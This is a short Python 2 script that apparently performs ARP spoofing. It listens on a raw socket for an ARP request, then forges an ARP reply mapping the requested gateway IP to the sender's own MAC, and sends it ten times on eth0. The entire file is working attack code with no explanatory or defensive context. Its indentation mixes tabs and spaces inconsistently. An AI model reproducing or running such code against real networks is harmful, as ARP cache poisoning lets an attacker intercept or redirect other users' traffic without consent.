import socket, struct, binascii

from uuid import getnode as get_mac
mac = get_mac()
my_mac=[]
for i in range(1,7): my_mac.append(mac>>8*(6-i)&0xff)

sock=socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))

while True:
	packet=sock.recvfrom(42)
    	ethr=packet[0][0:14]
    	eth=struct.unpack("!6s6s2s",ethr)

    	ethertype=eth[2]
    	arpr=packet[0][14:42]
    	arp=struct.unpack("!2s2sss2s6s4s6s4s",arpr)
    	if ethertype != '\x08\x06':
      	  continue
    	if arp[4]!='\x00\x01':
		  continue
	break
   
packet=""
ETHERNET_FRAME=[	
        struct.pack('!6B',ord(arp[5][0]),ord(arp[5][1]),ord(arp[5][2]),ord(arp[5][3]),ord(arp[5][4]),ord(arp[5][5])), 	# target MAC
        struct.pack('!6B',my_mac[0],my_mac[1],my_mac[2],my_mac[3],my_mac[4],my_mac[5]),	# my Mac
        struct.pack('!H',0x0806)
]
ARP_FRAME=[
	struct.pack('!H', 0x0001),
	struct.pack('!H', 0x0800),
	struct.pack('!B', 0x06),
	struct.pack('!B', 0x04),
	struct.pack('!H', 0x0002),
	struct.pack('!6B', my_mac[0],my_mac[1],my_mac[2],my_mac[3],my_mac[4],my_mac[5]),	# my MAC
	struct.pack('!4B', ord(arp[8][0]),ord(arp[8][1]),ord(arp[8][2]),ord(arp[8][3])),					# gateway IP
	struct.pack('!6B', ord(arp[5][0]),ord(arp[5][1]),ord(arp[5][2]),ord(arp[5][3]),ord(arp[5][4]),ord(arp[5][5])),	# target MAC
	struct.pack('!4B', ord(arp[6][0]),ord(arp[6][1]),ord(arp[6][2]),ord(arp[6][3]))			# target IP
]
sock.bind(("eth0", 0))
for i in range(0,3): packet+=ETHERNET_FRAME[i]
for i in range(0,9): packet+=ARP_FRAME[i]
for i in range(0,10):
    sock.send(packet)
    print "send!"
sock.close()
